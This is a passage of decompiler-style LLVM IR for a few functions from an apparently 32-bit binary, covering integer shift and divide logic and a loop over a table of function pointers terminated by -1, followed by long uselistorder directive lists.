  br i1 %v4_14f34, label %thread-pre-split12, label %bb99

bb99:                                             ; preds = %bb98
  %v5_14f38 = udiv i32 %v1_14f40, 8
  %v6_14f38 = or i32 %v1_14f38, %v5_14f38
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb99, %.thread10, %bb98
  %v1_14f50 = phi i32 [ %v1_14f38, %bb98 ], [ %v1_14f38, %.thread10 ], [ %v6_14f38, %bb99 ]
  %v0_14f3c = phi i32 [ %v6_14f34, %bb98 ], [ %v1_14f34, %.thread10 ], [ %v6_14f34, %bb99 ]
  %v2_14f3c = icmp eq i32 %v0_14f3c, 0
  br i1 %v2_14f3c, label %dec_label_pc_14f4c, label %bb100

bb100:                                            ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_14f40, 16
  br i1 %tmp, label %dec_label_pc_14f4c, label %.thread13

.thread13:                                        ; preds = %bb100
  %v4_14f40 = udiv i32 %v1_14f40, 16
  %v4_14f44 = udiv i32 %v1_14f44, 16
  br label %dec_label_pc_14f0c

dec_label_pc_14f4c:                               ; preds = %thread-pre-split12, %bb100
  %v1_14f4c = icmp slt i32 %v2_14ea4, 0
  br i1 %v1_14f4c, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_14f4c
  %v2_14f50 = sub i32 0, %v1_14f50
  br label %.thread16

.thread16:                                        ; preds = %bb105, %bb104, %bb102, %dec_label_pc_14f58, %dec_label_pc_14f4c, %bb101
  %v1_14f54 = phi i32 [ %v1_14f50, %dec_label_pc_14f4c ], [ %v2_14f50, %bb101 ], [ %v2_14f5c, %bb102 ], [ undef, %dec_label_pc_14f58 ], [ %v1_14f7080, %bb104 ], [ %v2_14f6c, %bb105 ]
  ret i32 %v1_14f54

dec_label_pc_14f58:                               ; preds = %thread-pre-split
  br i1 %v1_14ea0, label %bb102, label %.thread16

bb102:                                            ; preds = %dec_label_pc_14f58
  %v2_14f5c = sub i32 0, %v0_14ea4
  br label %.thread16

dec_label_pc_14f64:                               ; preds = %bb87
  br i1 %v3_14ec0, label %bb104, label %bb103

bb103:                                            ; preds = %dec_label_pc_14f64
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_14f64, %bb103
  %v1_14f7080 = phi i32 [ %v0_14ea4, %dec_label_pc_14f64 ], [ 0, %bb103 ]
  br i1 %v9_14ec0, label %bb105, label %.thread16

bb105:                                            ; preds = %bb104
  %v4_14f68 = ashr i32 %v2_14ea4, 31
  %v2_14f6c = or i32 %v4_14f68, 1
  br label %.thread16

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14ec8
  %v2_14f74 = icmp ugt i32 %v1_14f78, 65535
  br i1 %v2_14f74, label %bb106, label %.thread19

bb106:                                            ; preds = %dec_label_pc_14f74
  %v2_14f78 = and i32 %v1_14f78, 32768
  %v3_14f78 = icmp eq i32 %v2_14f78, 0
  %v4_14f78 = udiv i32 %v1_14f78, 65536
  br i1 %v3_14f78, label %.thread19, label %bb107

.thread19:                                        ; preds = %bb106, %dec_label_pc_14f74
  %v0_14f8470 = phi i32 [ %v1_14f78, %dec_label_pc_14f74 ], [ %v4_14f78, %bb106 ]
  br label %bb107

bb107:                                            ; preds = %bb106, %.thread19
  %v1_14f88 = phi i32 [ %v0_14f8470, %.thread19 ], [ %v4_14f78, %bb106 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb106 ]
  %v2_14f84 = icmp ugt i32 %v1_14f88, 255
  br i1 %v2_14f84, label %bb108, label %.thread20

bb108:                                            ; preds = %bb107
  %v2_14f88 = and i32 %v1_14f88, 128
  %v3_14f88 = icmp eq i32 %v2_14f88, 0
  %v4_14f88 = udiv i32 %v1_14f88, 256
  br i1 %v3_14f88, label %.thread20, label %bb109

bb109:                                            ; preds = %bb108
  %v2_14f8c = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb108, %bb107, %bb109
  %v1_14f98 = phi i32 [ %storemerge, %bb107 ], [ %storemerge, %bb108 ], [ %v2_14f8c, %bb109 ]
  %v1_14f94 = phi i32 [ %v1_14f88, %bb107 ], [ %v4_14f88, %bb108 ], [ %v4_14f88, %bb109 ]
  %v2_14f90 = icmp ugt i32 %v1_14f94, 15
  br i1 %v2_14f90, label %bb110, label %.thread21

bb110:                                            ; preds = %.thread20
  %v2_14f94 = and i32 %v1_14f94, 8
  %v3_14f94 = icmp eq i32 %v2_14f94, 0
  %v4_14f94 = udiv i32 %v1_14f94, 16
  br i1 %v3_14f94, label %.thread21, label %bb111

bb111:                                            ; preds = %bb110
  %v2_14f98 = add nsw i32 %v1_14f98, 4
  br label %.thread21

.thread21:                                        ; preds = %bb110, %.thread20, %bb111
  %v4_14fa0 = phi i32 [ %v1_14f98, %.thread20 ], [ %v1_14f98, %bb110 ], [ %v2_14f98, %bb111 ]
  %v5_14fa4 = phi i32 [ %v1_14f94, %.thread20 ], [ %v4_14f94, %bb110 ], [ %v4_14f94, %bb111 ]
  %v2_14f9c = icmp ugt i32 %v5_14fa4, 3
  %v7_14f9c = icmp eq i32 %v5_14fa4, 4
  %v2_14fa0 = xor i1 %v7_14f9c, true
  %v3_14fa0 = and i1 %v2_14f9c, %v2_14fa0
  br i1 %v3_14fa0, label %bb112, label %bb113

bb112:                                            ; preds = %.thread21
  %v5_14fa0 = add nsw i32 %v4_14fa0, 3
  br label %bb113

bb113:                                            ; preds = %.thread21, %bb112
  %v4_14fa4 = phi i32 [ %v4_14fa0, %.thread21 ], [ %v5_14fa0, %bb112 ]
  %v2_14fa4 = xor i1 %v2_14f9c, true
  %v3_14fa4 = or i1 %v7_14f9c, %v2_14fa4
  br i1 %v3_14fa4, label %bb114, label %bb115

bb114:                                            ; preds = %bb113
  %v8_14fa4 = udiv i32 %v5_14fa4, 2
  %v9_14fa4 = add i32 %v4_14fa4, %v8_14fa4
  br label %bb115

bb115:                                            ; preds = %bb113, %bb114
  %v1_14fac = phi i32 [ %v4_14fa4, %bb113 ], [ %v9_14fa4, %bb114 ]
  %v1_14fa8 = icmp slt i32 %v2_14ea4, 0
  %v6_14fac = lshr i32 %v0_14fac, %v1_14fac
  %v2_14fb0 = sub i32 0, %v6_14fac
  %v2_14fb0.v6_14fac = select i1 %v1_14fa8, i32 %v2_14fb0, i32 %v6_14fac
  ret i32 %v2_14fb0.v6_14fac

dec_label_pc_14fb8:                               ; preds = %dec_label_pc_14ea0
  %v0_14fb8 = load i32, i32* @lr, align 4
  %v0_14fbc = call i32 @function_cbe0()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_14fb8)
  %v9_14fc8 = load i32, i32* @lr, align 4
  %v0_14fcc = call i32 @function_14ea0()
  store i32 %v9_14fc8, i32* @lr, align 4
  ret i32 %v0_14fcc

; uselistorder directives
  uselistorder i32 %v4_14fa4, { 1, 0 }
  uselistorder i1 %v7_14f9c, { 1, 0 }
  uselistorder i32 %v4_14f94, { 1, 0 }
  uselistorder i32 %v1_14f94, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14f88, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14f88, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14f78, { 1, 0 }
  uselistorder i32 %v0_14f3c, { 1, 0 }
  uselistorder i32 %v4_14f30, { 1, 0 }
  uselistorder i32 %v1_14f38, { 1, 2, 0 }
  uselistorder i32 %v4_14f24, { 1, 0 }
  uselistorder i32 %v1_14f2c, { 1, 2, 0 }
  uselistorder i32 %v4_14f18, { 1, 0 }
  uselistorder i32 %v1_14f20, { 1, 2, 0 }
  uselistorder i32 %v1_14f44, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14f14, { 1, 0 }
  uselistorder i32 %v1_14f40, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14f00, { 1, 0 }
  uselistorder i32 %v3_14efc, { 1, 0 }
  uselistorder i32 %v1_14efc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_14ef8, { 1, 0 }
  uselistorder i32 %v1_14f00, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14eec, { 1, 0 }
  uselistorder i32 %v4_14ee8, { 2, 1, 0 }
  uselistorder i32 %v1_14eec, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14ef4.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_14ec0, { 1, 0 }
  uselistorder i32 %v1_14f78, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_14ea4, { 1, 0, 2 }
  uselistorder i32 %v0_14ea4, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_14ea0, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_14ea0, { 2, 0, 1 }
  uselistorder i32 ()* @function_cbe0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 11, 12, 71, 13, 14, 72, 31, 32, 33, 34, 37, 38, 39, 4, 40, 41, 42, 43, 17, 18, 19, 73, 74, 75, 76, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 78, 77, 0, 79, 80, 1, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 5, 126, 127, 128, 6, 129, 130, 131, 7, 132, 133, 134, 135, 136, 137, 138, 139, 104, 81, 82, 83, 84, 85, 26, 27, 86, 8, 88, 89, 87, 140, 29, 114, 141, 142, 20, 21, 22, 23, 105, 106, 107, 143, 45, 35, 36, 90, 91, 56, 57, 58, 59, 60, 61, 109, 24, 62, 63, 110, 111, 92, 93, 94, 95, 96, 97, 98, 10, 9, 2, 99, 100, 101, 102, 3, 103, 108, 15, 16, 112, 28, 113, 115, 25, 30, 64, 65, 66, 67, 68, 69, 70 }
  uselistorder i32 3, { 64, 49, 65, 50, 14, 26, 27, 57, 22, 58, 59, 23, 60, 61, 15, 66, 0, 29, 28, 38, 3, 2, 1, 4, 62, 30, 5, 6, 16, 7, 8, 39, 40, 72, 41, 42, 43, 44, 45, 46, 67, 12, 31, 68, 32, 9, 13, 51, 73, 21, 52, 70, 71, 17, 63, 18, 19, 11, 20, 69, 10, 47, 24, 48, 25, 33, 34, 35, 53, 54, 55, 36, 56, 37 }
  uselistorder i32 15, { 3, 4, 1, 5, 2, 0 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 130, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 131, 67, 132, 68, 133, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 124, 1, 81, 84, 83, 82, 87, 86, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 134, 97, 98, 99, 123, 104, 100, 101, 105, 102, 103, 106, 111, 107, 108, 110, 109, 112, 114, 113, 125, 126, 115, 116, 117, 118, 119, 120, 121, 127, 129, 122, 128 }
  uselistorder i32 128, { 13, 12, 6, 7, 9, 5, 20, 0, 21, 22, 1, 8, 10, 15, 16, 17, 2, 3, 11, 18, 19, 4, 14 }
  uselistorder i32 255, { 7, 8, 11, 3, 9, 0, 1, 12, 4, 5, 6, 10, 2 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50 }
  uselistorder i32 32768, { 3, 2, 1, 0, 4 }
  uselistorder i32 65535, { 3, 4, 1, 0, 2 }
  uselistorder i32 31, { 10, 11, 9, 3, 12, 2, 1, 0, 4, 6, 5, 7, 13, 14, 8 }
  uselistorder i32 4, { 202, 203, 128, 7, 8, 204, 205, 127, 9, 10, 166, 11, 87, 88, 89, 167, 168, 169, 170, 171, 172, 173, 0, 12, 56, 174, 175, 176, 177, 178, 179, 180, 55, 181, 90, 91, 92, 182, 183, 80, 184, 69, 185, 13, 14, 1, 134, 206, 207, 208, 209, 210, 246, 247, 248, 93, 94, 95, 81, 96, 97, 98, 99, 100, 101, 186, 102, 103, 187, 188, 82, 104, 15, 211, 16, 79, 70, 71, 17, 277, 72, 58, 18, 19, 73, 74, 278, 279, 280, 281, 75, 282, 283, 284, 285, 76, 286, 287, 288, 289, 290, 20, 291, 292, 293, 294, 295, 77, 57, 296, 297, 298, 299, 300, 301, 21, 22, 78, 249, 250, 83, 212, 213, 214, 215, 84, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 251, 226, 302, 303, 304, 306, 307, 105, 106, 107, 140, 141, 142, 143, 23, 131, 108, 132, 109, 62, 133, 150, 110, 151, 152, 2, 273, 274, 275, 276, 63, 111, 112, 254, 256, 255, 252, 253, 135, 136, 137, 138, 257, 258, 259, 260, 261, 262, 263, 264, 265, 189, 190, 191, 192, 193, 194, 3, 24, 195, 158, 305, 227, 25, 26, 27, 28, 4, 29, 59, 60, 30, 5, 66, 6, 31, 113, 51, 32, 33, 196, 144, 114, 34, 115, 116, 117, 118, 119, 228, 35, 229, 120, 230, 231, 232, 233, 234, 235, 236, 121, 237, 238, 239, 240, 241, 242, 52, 245, 122, 123, 244, 129, 243, 266, 267, 85, 268, 269, 145, 146, 147, 61, 64, 148, 149, 270, 271, 36, 37, 67, 38, 39, 68, 65, 40, 41, 139, 42, 43, 44, 45, 46, 124, 47, 125, 153, 154, 53, 155, 156, 157, 159, 160, 161, 162, 163, 164, 165, 197, 86, 198, 199, 200, 126, 48, 272, 54, 49, 201, 50, 130 }
  uselistorder i32 2, { 1, 113, 2, 3, 4, 5, 6, 7, 112, 8, 9, 10, 11, 12, 44, 45, 13, 124, 64, 65, 126, 104, 105, 125, 66, 127, 128, 129, 130, 131, 42, 80, 115, 14, 116, 117, 132, 133, 134, 15, 46, 47, 48, 49, 50, 51, 141, 142, 106, 107, 108, 76, 16, 109, 52, 158, 159, 69, 160, 161, 55, 162, 54, 163, 53, 154, 143, 41, 144, 145, 17, 146, 147, 0, 81, 82, 119, 83, 120, 84, 121, 18, 110, 67, 118, 19, 164, 68, 135, 20, 85, 136, 137, 21, 86, 138, 139, 77, 123, 22, 56, 114, 23, 24, 57, 58, 59, 71, 60, 72, 61, 62, 63, 43, 155, 156, 148, 149, 78, 25, 26, 27, 111, 28, 79, 150, 73, 70, 29, 151, 152, 153, 157, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 87, 88, 89, 90, 91, 92, 93, 94, 74, 95, 122, 75, 96, 97, 98, 99, 140, 40, 100, 101, 102, 103 }
  uselistorder i32 16, { 3, 22, 4, 5, 1, 6, 7, 8, 23, 9, 10, 2, 11, 12, 56, 57, 58, 0, 59, 60, 13, 14, 61, 62, 15, 63, 64, 98, 99, 79, 80, 65, 66, 30, 31, 32, 109, 33, 110, 111, 34, 112, 113, 35, 114, 115, 116, 117, 118, 119, 100, 101, 102, 81, 82, 36, 83, 84, 85, 86, 87, 88, 89, 90, 103, 37, 91, 47, 51, 67, 68, 27, 45, 16, 54, 55, 25, 120, 26, 69, 70, 71, 72, 73, 104, 105, 74, 75, 76, 92, 93, 94, 95, 96, 97, 46, 106, 107, 48, 108, 24, 17, 18, 19, 20, 21, 41, 49, 50, 38, 39, 40, 52, 53, 28, 77, 42, 78, 29, 43, 44 }
  uselistorder i32 268435455, { 2, 3, 4, 0, 5, 1 }
  uselistorder i32 8, { 47, 25, 3, 4, 15, 5, 46, 26, 6, 7, 16, 8, 65, 66, 67, 68, 0, 1, 69, 70, 71, 72, 73, 9, 74, 50, 39, 40, 48, 111, 112, 113, 114, 21, 115, 80, 75, 139, 31, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 32, 116, 81, 82, 83, 84, 85, 86, 87, 88, 89, 23, 90, 49, 91, 92, 93, 117, 118, 119, 156, 51, 10, 58, 138, 123, 122, 120, 121, 53, 54, 55, 124, 125, 126, 127, 128, 129, 11, 76, 77, 2, 63, 64, 27, 155, 35, 36, 33, 34, 17, 18, 29, 30, 37, 157, 94, 78, 130, 131, 95, 96, 45, 97, 98, 99, 100, 22, 101, 41, 42, 102, 103, 104, 38, 105, 106, 107, 108, 28, 19, 20, 109, 110, 43, 132, 133, 52, 134, 135, 24, 136, 137, 56, 57, 12, 13, 44, 14, 59, 60, 61, 62, 79 }
  uselistorder i32 536870912, { 0, 1, 3, 2 }
  uselistorder i1 true, { 0, 1, 2, 3, 4, 45, 48, 5, 6, 8, 7, 9, 51, 49, 10, 11, 12, 13, 14, 15, 50, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 43, 30, 31, 28, 29, 52, 53, 54, 55, 32, 33, 44, 56, 57, 34, 35, 36, 46, 37, 38, 39, 40, 47, 41, 42 }
  uselistorder i32* @r1, { 87, 88, 46, 47, 1, 48, 49, 20, 50, 53, 51, 52, 10, 19, 26, 24, 25, 27, 54, 55, 56, 57, 58, 59, 60, 61, 3, 120, 121, 89, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 4, 29, 30, 16, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 6, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 5, 183, 184, 14, 122, 123, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 18, 21, 22, 23, 185, 2, 186, 39, 44, 42, 124, 129, 130, 133, 131, 132, 125, 126, 127, 128, 31, 73, 79, 187, 188, 189, 12, 106, 107, 108, 11, 109, 74, 75, 76, 77, 78, 7, 80, 81, 82, 8, 9, 15, 110, 111, 112, 113, 114, 0, 115, 116, 117, 13, 28, 134, 40, 118, 41, 119, 17, 32, 33, 34, 35, 36, 37, 38, 43, 45, 83, 84, 85, 86, 135, 136 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_14f4c, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14f08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ef4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_14fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14fe0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14fe4 = load i32, i32* @global_var_18000.505, align 4
  %v7_14fe8 = icmp eq i32 %v3_14fe4, -1
  %v3_14fec = load i32, i32* @r4, align 4
  store i32 %v3_14fec, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_18000.505 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_14fe8, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_14fe0
  store i32 %v3_14fec, i32* %r4.global-to-local, align 4
  %v9_14ff4 = load i32, i32* @r0, align 4
  ret i32 %v9_14ff4

.preheader:                                       ; preds = %dec_label_pc_14fe0, %.preheader
  %v0_14ffc = phi i32 [ %v3_15000, %.preheader ], [ %v3_14fe4, %dec_label_pc_14fe0 ]
  call void @__pseudo_branch(i32 %v0_14ffc)
  %v0_15000 = load i32, i32* %r4.global-to-local, align 4
  %v1_15000 = add i32 %v0_15000, -4
  %v2_15000 = inttoptr i32 %v1_15000 to i32*
  %v3_15000 = load i32, i32* %v2_15000, align 4
  store i32 %v1_15000, i32* %r4.global-to-local, align 4
  %v3_15004 = icmp eq i32 %v3_15000, -1
  br i1 %v3_15004, label %dec_label_pc_1500c, label %.preheader

dec_label_pc_1500c:                               ; preds = %.preheader
  %v2_1500c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1500c, i32* %r4.global-to-local, align 4
  %v8_1500c = load i32, i32* @r0, align 4
  ret i32 %v8_1500c

; uselistorder directives
  uselistorder i32 %v3_15000, { 1, 0 }
  uselistorder i32 %v3_14fe4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 59, 21, 22, 50, 23, 24, 60, 61, 62, 6, 25, 26, 27, 63, 64, 65, 7, 28, 29, 30, 66, 67, 68, 8, 31, 32, 69, 20, 19, 70, 71, 72, 18, 17, 16, 15, 33, 34, 35, 36, 37, 3, 38, 4, 39, 5, 73, 14, 40, 10, 51, 1, 45, 55, 46, 41, 42, 47, 48, 49, 56, 57, 43, 58, 11, 9, 52, 53, 54, 13, 12, 44, 0, 2 }
  uselistorder i32 -1, { 152, 0, 153, 154, 1, 42, 43, 2, 233, 155, 32, 33, 66, 285, 246, 67, 234, 132, 3, 235, 68, 4, 5, 69, 215, 6, 7, 8, 75, 73, 70, 216, 119, 120, 74, 72, 71, 133, 217, 236, 156, 157, 63, 34, 9, 76, 247, 158, 159, 248, 249, 77, 237, 10, 78, 35, 36, 160, 161, 162, 79, 238, 163, 49, 80, 12, 13, 135, 44, 45, 134, 239, 51, 50, 46, 47, 164, 121, 122, 165, 166, 11, 240, 250, 167, 64, 37, 168, 251, 14, 38, 169, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 170, 286, 287, 171, 56, 252, 172, 173, 253, 254, 65, 57, 58, 255, 256, 257, 258, 259, 59, 136, 260, 128, 151, 137, 261, 262, 263, 174, 138, 264, 15, 265, 175, 16, 176, 266, 267, 139, 81, 221, 82, 310, 311, 83, 289, 84, 222, 85, 312, 86, 226, 87, 313, 88, 314, 89, 315, 90, 316, 91, 223, 92, 224, 93, 317, 94, 318, 60, 319, 17, 177, 18, 95, 227, 228, 178, 179, 180, 229, 230, 140, 19, 218, 55, 181, 182, 141, 183, 20, 21, 53, 96, 268, 97, 220, 98, 231, 99, 269, 100, 270, 101, 241, 102, 271, 103, 272, 142, 242, 104, 243, 184, 105, 106, 273, 150, 107, 185, 186, 187, 188, 189, 190, 191, 192, 149, 274, 108, 244, 193, 245, 194, 22, 52, 61, 62, 290, 195, 275, 196, 143, 276, 39, 277, 278, 144, 23, 197, 198, 123, 129, 127, 279, 24, 130, 27, 25, 26, 131, 145, 280, 281, 199, 28, 40, 48, 124, 41, 225, 282, 146, 109, 291, 110, 288, 111, 232, 112, 283, 113, 293, 114, 320, 115, 219, 116, 294, 117, 284, 118, 292, 200, 201, 202, 203, 204, 205, 206, 147, 207, 208, 209, 210, 211, 212, 213, 29, 30, 31, 125, 126, 54, 214, 148 }
  uselistorder i32* @global_var_18000.505, { 1, 0 }
  uselistorder i32 1, { 517, 294, 1001, 352, 1002, 353, 1003, 864, 865, 866, 867, 868, 869, 870, 518, 326, 327, 325, 322, 321, 323, 324, 871, 444, 872, 873, 519, 190, 191, 195, 189, 192, 194, 193, 375, 874, 875, 520, 236, 235, 876, 387, 877, 882, 883, 428, 884, 885, 886, 445, 446, 887, 888, 521, 335, 338, 340, 339, 336, 337, 522, 889, 523, 243, 242, 241, 244, 890, 524, 82, 83, 891, 892, 893, 894, 525, 10, 11, 776, 777, 778, 779, 780, 781, 782, 783, 784, 528, 527, 526, 245, 246, 247, 785, 786, 787, 788, 789, 532, 531, 530, 529, 283, 282, 288, 284, 287, 286, 285, 289, 290, 281, 291, 388, 895, 896, 389, 897, 898, 899, 900, 901, 447, 902, 903, 904, 905, 906, 534, 533, 147, 145, 149, 146, 150, 151, 152, 144, 148, 368, 911, 907, 908, 909, 910, 413, 535, 33, 34, 35, 800, 801, 802, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 536, 104, 105, 98, 99, 100, 101, 103, 102, 376, 58, 1070, 1071, 1072, 1073, 1074, 1075, 537, 307, 308, 309, 306, 538, 227, 377, 448, 1004, 539, 163, 161, 160, 164, 162, 1076, 1077, 449, 540, 46, 47, 44, 48, 43, 45, 1005, 1006, 542, 541, 330, 331, 333, 332, 334, 543, 196, 544, 450, 451, 545, 106, 928, 390, 927, 378, 358, 931, 391, 929, 0, 934, 935, 936, 937, 548, 547, 546, 229, 228, 938, 939, 940, 941, 942, 429, 943, 944, 430, 946, 452, 947, 423, 424, 433, 1, 431, 432, 948, 945, 453, 949, 419, 555, 554, 503, 553, 552, 504, 551, 550, 549, 369, 416, 950, 951, 952, 953, 954, 392, 556, 165, 803, 804, 805, 557, 302, 303, 301, 300, 1007, 379, 1008, 1133, 380, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 505, 559, 558, 75, 76, 68, 73, 69, 74, 67, 70, 72, 71, 454, 1078, 1079, 1080, 1081, 1082, 1083, 560, 506, 186, 184, 185, 381, 393, 1009, 455, 1010, 1011, 456, 366, 394, 363, 425, 426, 1012, 457, 1013, 1014, 1015, 1016, 395, 1017, 354, 1018, 1019, 458, 1020, 1021, 573, 572, 571, 570, 569, 568, 567, 566, 565, 564, 563, 562, 561, 507, 125, 127, 130, 135, 126, 124, 121, 136, 129, 128, 123, 122, 134, 131, 133, 132, 1022, 1023, 508, 574, 200, 198, 203, 205, 201, 202, 197, 199, 204, 1024, 1025, 1026, 1027, 364, 1028, 1029, 1030, 575, 109, 110, 107, 111, 108, 1031, 1032, 576, 237, 1084, 1085, 1086, 1087, 1088, 113, 117, 118, 116, 115, 114, 120, 119, 577, 240, 1033, 579, 578, 84, 85, 86, 396, 434, 582, 581, 580, 583, 347, 584, 31, 32, 585, 173, 174, 586, 214, 13, 587, 12, 588, 310, 589, 225, 590, 314, 591, 311, 592, 348, 593, 279, 594, 170, 304, 233, 2, 598, 597, 596, 595, 66, 65, 459, 599, 397, 460, 600, 234, 601, 842, 606, 605, 604, 603, 602, 175, 176, 178, 179, 177, 831, 832, 609, 608, 607, 223, 224, 610, 370, 849, 365, 850, 398, 611, 90, 96, 89, 93, 92, 95, 97, 91, 94, 371, 790, 612, 215, 217, 218, 216, 219, 843, 399, 844, 400, 845, 614, 613, 258, 259, 257, 260, 261, 615, 157, 153, 159, 155, 154, 156, 158, 616, 618, 617, 1146, 401, 621, 620, 619, 329, 328, 622, 263, 264, 262, 265, 266, 267, 268, 269, 623, 182, 183, 181, 180, 624, 625, 313, 312, 402, 1089, 626, 137, 138, 627, 276, 628, 187, 629, 222, 630, 88, 631, 256, 632, 238, 633, 206, 634, 87, 461, 955, 367, 956, 957, 462, 976, 638, 637, 636, 635, 50, 51, 52, 49, 639, 640, 852, 853, 3, 854, 403, 855, 642, 641, 296, 297, 295, 1147, 643, 930, 644, 878, 879, 880, 881, 1034, 1035, 645, 298, 382, 1036, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 253, 251, 252, 254, 255, 977, 978, 4, 979, 5, 6, 7, 404, 980, 981, 8, 41, 42, 982, 359, 171, 172, 1128, 1129, 933, 932, 791, 792, 793, 794, 795, 796, 797, 1151, 212, 213, 210, 211, 1037, 140, 139, 463, 646, 464, 983, 984, 985, 986, 647, 509, 79, 80, 77, 81, 78, 1093, 1090, 1091, 1092, 360, 383, 54, 57, 53, 55, 56, 1094, 1095, 1096, 1097, 1098, 1099, 648, 62, 59, 64, 61, 60, 63, 405, 1100, 1101, 465, 1102, 650, 649, 207, 208, 209, 652, 651, 280, 987, 988, 654, 653, 36, 37, 38, 656, 655, 293, 292, 833, 658, 657, 40, 39, 420, 1038, 467, 1039, 1040, 406, 407, 1041, 1042, 468, 1043, 1045, 1046, 1047, 469, 1049, 408, 1050, 1048, 466, 1051, 470, 1052, 421, 1053, 1054, 1044, 662, 661, 660, 659, 16, 20, 18, 21, 24, 17, 22, 23, 19, 25, 1055, 663, 341, 345, 342, 344, 343, 664, 275, 274, 1056, 1057, 1058, 665, 14, 15, 422, 372, 1060, 373, 1061, 409, 1062, 1063, 1065, 361, 1066, 471, 1067, 374, 1064, 412, 673, 672, 671, 670, 669, 668, 667, 666, 166, 168, 167, 169, 472, 384, 674, 248, 249, 250, 1059, 435, 510, 675, 305, 473, 798, 799, 676, 318, 317, 319, 1148, 436, 1149, 1150, 677, 316, 315, 277, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 385, 1117, 680, 679, 678, 28, 27, 26, 30, 29, 474, 417, 418, 834, 683, 682, 681, 270, 272, 271, 273, 685, 684, 278, 687, 686, 688, 1118, 1119, 1120, 1121, 1122, 691, 690, 689, 142, 143, 835, 692, 141, 693, 112, 694, 239, 695, 226, 221, 696, 299, 697, 346, 698, 699, 320, 700, 220, 437, 1123, 1124, 438, 1130, 1131, 806, 807, 808, 809, 810, 811, 478, 812, 813, 357, 476, 477, 814, 479, 815, 480, 816, 475, 817, 818, 708, 707, 706, 705, 704, 703, 702, 701, 484, 481, 482, 483, 485, 486, 712, 711, 710, 709, 819, 820, 511, 713, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 714, 513, 512, 715, 716, 846, 487, 